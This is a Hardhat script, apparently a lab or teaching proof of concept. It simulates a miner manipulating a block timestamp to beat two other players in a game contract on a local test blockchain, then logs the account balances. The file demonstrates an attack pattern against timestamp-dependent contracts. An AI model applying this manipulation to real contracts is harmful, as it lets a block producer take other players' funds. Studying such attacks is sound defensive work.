const { ethers, network } = require('hardhat');

async function main() {
  const [user1, user2, miner] = await ethers.getSigners();
  const gameContractAddress = '0x5FbDB2315678afecb367f032d93F642f64180aa3';

  // User1 playing game
  await user1.sendTransaction({
    to: gameContractAddress,
    value: ethers.utils.parseEther('1.0'), // Sends exactly 1.0 ether
    gasLimit: '999999',
  });

  // User2 playing game
  await user2.sendTransaction({
    to: gameContractAddress,
    value: ethers.utils.parseEther('1.0'), // Sends exactly 1.0 ether
    gasLimit: '999999',
  });

  // Miner manipulating the next block timestamp
  await network.provider.send('evm_setNextBlockTimestamp', [1699531300]);

  await miner.sendTransaction({
    to: gameContractAddress,
    value: ethers.utils.parseEther('1.0'), // Sends exactly 1.0 ether
    gasLimit: '999999',
  });

  // Fetch the block details
  const receipt = await ethers.provider.getBlock('latest');
  console.log('Latest block timestamp:', receipt.timestamp);

  // Get balance of the contract
  const balance = await ethers.provider.getBalance(gameContractAddress);
  console.log(`Contract Balance: ${ethers.utils.formatEther(balance)}`);

  // Get balance of miner account
  const balanceUser1 = await ethers.provider.getBalance(user1.address);
  console.log(`User1 Balance: ${ethers.utils.formatEther(balanceUser1)}`);

  // Get balance of miner account
  const balanceUser2 = await ethers.provider.getBalance(user2.address);
  console.log(`User2 Balance: ${ethers.utils.formatEther(balanceUser2)}`);

  // Get balance of miner account
  const balanceMiner = await ethers.provider.getBalance(miner.address);
  console.log(`Miner Balance: ${ethers.utils.formatEther(balanceMiner)}`);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
